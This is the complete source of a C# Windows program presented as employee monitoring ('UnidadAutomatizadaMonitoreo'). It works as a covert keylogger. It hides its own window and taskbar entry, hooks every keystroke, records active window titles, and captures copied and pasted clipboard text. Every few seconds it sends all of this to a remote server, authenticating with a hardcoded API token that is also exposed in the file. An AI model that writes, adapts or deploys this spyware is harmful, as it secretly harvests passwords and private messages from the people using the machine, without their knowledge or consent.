using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Text.Json;
using System.Diagnostics;
using System.Windows.Forms;

namespace UnidadAutomatizadaMonitoreo
{
    class Program : Form
    {
        // ==========================================
        // CONFIG API
        // ==========================================
        static readonly string ApiUrl = "https://uam.neobash.site/api/logs";
        static readonly string ApiToken = "1|azIcluH5CvcfvqrcmhaZHAouVYTrbcd03fXepYO832bb8316";
        static readonly string EmployeeId = "KRYS-CALL-C-01";

        static readonly HttpClient client = new HttpClient();

        static string ultimaVentana = "";
        static Program instancia;

        // ==========================================
        // MAIN
        // ==========================================
        [STAThread]
        static void Main()
        {
            client.DefaultRequestHeaders.Add("Authorization", $"Bearer {ApiToken}");
            client.DefaultRequestHeaders.Add("Accept", "application/json");

            Application.EnableVisualStyles();
            Application.Run(new Program());
        }

        public Program()
        {
            instancia = this;

            this.Load += (s, e) => {
                this.Visible = false;
                this.ShowInTaskbar = false;
                this.WindowState = FormWindowState.Minimized;
            };

            IniciarHookTeclado();
            IniciarMonitorVentanas();
            IniciarClipboardListener();
            IniciarEnvioTeclado();
        }

        // ==========================================
        // 1. HOOK TECLADO
        // ==========================================
        private static IntPtr _hookID = IntPtr.Zero;
        private static LowLevelKeyboardProc _proc = HookCallback;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        static StringBuilder bufferTeclado = new StringBuilder();
        static DateTime ultimoEnvio = DateTime.Now;
        static DateTime ultimoPegado = DateTime.MinValue;

        static void IniciarHookTeclado()
        {
            _hookID = SetHook(_proc);
        }

        static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                bool ctrl = (GetKeyState(0x11) & 0x8000) != 0;

                // Detectar Ctrl + V de forma segura
                if (ctrl && vkCode == 0x56)
                {
                    if ((DateTime.Now - ultimoPegado).TotalMilliseconds > 300)
                    {
                        ultimoPegado = DateTime.Now;

                        try
                        {
                            instancia?.BeginInvoke(new Action(() =>
                            {
                                DetectarPegado();
                            }));
                        }
                        catch { }
                    }
                }

                bufferTeclado.Append(TraducirTecla(vkCode));
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static void DetectarPegado()
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    string texto = Clipboard.GetText();

                    if (!string.IsNullOrEmpty(texto))
                    {
                        string recortado = texto.Length > 1000
                            ? texto.Substring(0, 1000) + "..."
                            : texto;

                        _ = EnviarDatos("paste", ultimaVentana,
                            new { texto_pegado = "[PEGADO] " + recortado });
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error paste: " + ex.Message);
            }
        }

        static void IniciarEnvioTeclado()
        {
            Task.Run(async () =>
            {
                while (true)
                {
                    if ((DateTime.Now - ultimoEnvio).TotalSeconds >= 5 && bufferTeclado.Length > 0)
                    {
                        await EnviarDatos("keystroke", ultimaVentana,
                            new { texto_capturado = bufferTeclado.ToString() });

                        bufferTeclado.Clear();
                        ultimoEnvio = DateTime.Now;
                    }

                    await Task.Delay(200);
                }
            });
        }

        // ==========================================
        // 2. VENTANA ACTIVA (FIX EXPLORER)
        // ==========================================

        static void IniciarMonitorVentanas()
        {
            Task.Run(async () =>
            {
                while (true)
                {
                    IntPtr handle = GetForegroundWindow();

                    GetWindowThreadProcessId(handle, out uint pid);

                    try
                    {
                        var proceso = Process.GetProcessById((int)pid);
                        string nombreProceso = proceso.ProcessName;

                        string titulo = ObtenerTituloVentana(handle);

                        string ventanaActual = string.IsNullOrEmpty(titulo)
                            ? nombreProceso
                            : $"{nombreProceso} - {titulo}";

                        if (ventanaActual != ultimaVentana)
                        {
                            ultimaVentana = ventanaActual;

                            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] {ventanaActual}");

                            await EnviarDatos("window_focus", ventanaActual,
                                new { proceso = nombreProceso });
                        }
                    }
                    catch { }

                    await Task.Delay(500);
                }
            });
        }

        // 🔥 NUEVO MÉTODO PARA TITULO REAL
        static string ObtenerTituloVentana(IntPtr handle)
        {
            StringBuilder sb = new StringBuilder(512);
            GetWindowText(handle, sb, sb.Capacity);
            return sb.ToString();
        }

        // ==========================================
        // 3. CLIPBOARD EVENT
        // ==========================================
        private const int WM_CLIPBOARDUPDATE = 0x031D;

        void IniciarClipboardListener()
        {
            AddClipboardFormatListener(this.Handle);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE)
            {
                try
                {
                    if (Clipboard.ContainsText())
                    {
                        string texto = Clipboard.GetText();

                        if (!string.IsNullOrEmpty(texto))
                        {
                            string recortado = texto.Length > 1000
                                ? texto.Substring(0, 1000) + "..."
                                : texto;

                            _ = EnviarDatos("clipboard", ultimaVentana,
                                new { texto_capturado = "[COPIADO] " + recortado });
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Clipboard error: " + ex.Message);
                }
            }

            base.WndProc(ref m);
        }

        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(false);
        }

        // ==========================================
        // API
        // ==========================================
        static async Task EnviarDatos(string tipoEvento, string ventana, object payload)
        {
            var logData = new
            {
                employee_identifier = EmployeeId,
                event_type = tipoEvento,
                window_title = ventana,
                url_or_path = "Windows",
                payload = payload
            };

            string json = JsonSerializer.Serialize(logData);
            var content = new StringContent(json, Encoding.UTF8, "application/json");

            try { await client.PostAsync(ApiUrl, content); } catch { }
        }

        // ==========================================
        // IMPORTS
        // ==========================================
        [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
        [DllImport("user32.dll")] static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll")] static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        // ==========================================
        // UTILIDADES
        // ==========================================
        static string TraducirTecla(int vkCode)
        {
            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
            bool caps = Console.CapsLock;

            if (vkCode >= 65 && vkCode <= 90)
            {
                bool upper = shift ^ caps;
                char c = (char)vkCode;
                return upper ? c.ToString() : c.ToString().ToLower();
            }

            if (vkCode >= 48 && vkCode <= 57)
                return ((char)vkCode).ToString();

            if (vkCode == 32) return " ";
            if (vkCode == 13) return " [ENTER] ";
            if (vkCode == 8) return "[BACKSPACE]";

            return "";
        }
    }
}